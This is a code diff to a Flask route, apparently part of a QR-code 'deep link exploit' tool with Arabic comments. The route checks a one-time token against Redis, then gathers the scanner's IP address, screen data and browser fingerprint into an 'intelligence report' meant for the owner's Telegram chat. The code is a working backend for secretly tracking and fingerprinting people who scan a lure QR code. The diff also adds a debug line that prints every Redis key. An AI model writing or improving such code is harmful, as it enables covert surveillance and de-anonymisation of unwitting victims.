@@ -3,11 +3,11 @@ import io
 import json
 import redis
 import qrcode
-from flask import Blueprint, request, jsonify, redirect, url_for
+from flask import Blueprint, request, jsonify, redirect
 
 qr_bp = Blueprint('qr_deep_link_exploit_v2', __name__)
 
-# --- تنزيل وتطهير رابط الـ Redis بحماية قصوى ---
+# --- اتصال وتطهير رابط الـ Redis ---
 REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
 if REDIS_URL.startswith("redis-cli"):
     REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
@@ -45,7 +45,10 @@ def init_qr_routes(app, bot):
                 print("[-] Redis client is offline.")
                 return jsonify({"status": "error", "message": "Database offline"}), 500
 
-            # البحث عن الـ Token في Redis وحذفه فوراً لمنع التكرار
+            # فحص المفاتيح المتاحة للتأكد من التطابق في حالة وجود مشاكل
+            print(f"[*] Active Redis Keys in DB: {redis_client.keys('*')}")
+
+            # البحث عن الـ Token بالمفتاح الموحد
             redis_key = f"qr_token:{token}"
             owner_chat_id = redis_client.get(redis_key)
             print(f"[*] Redis Lookup -> Key: {redis_key} | Found Chat ID: {owner_chat_id}")
@@ -54,6 +57,7 @@ def init_qr_routes(app, bot):
                 print(f"[-] Token '{token}' not found or expired in Redis!")
                 return jsonify({"status": "error", "message": "Token expired or invalid"}), 404
 
+            # حذف الـ Token بعد إيجاده لمرة واحدة فقط لمنع إعادة استخدامه
             redis_client.delete(redis_key)
 
             source_ip = (
@@ -71,7 +75,6 @@ def init_qr_routes(app, bot):
             screen = data.get('screen', {})
             fingerprint = data.get('fingerprint', {})
 
-            # كتابة الرسالة كنص عادي تماماً (Plain Text) لتجنب أي أخطاء في الرموز الخاصة
             msg = (
                 "🎯🔥 [تقرير استخبارات الـ QR الميدانية]\n"
                 "--------------------------------------------------\n"
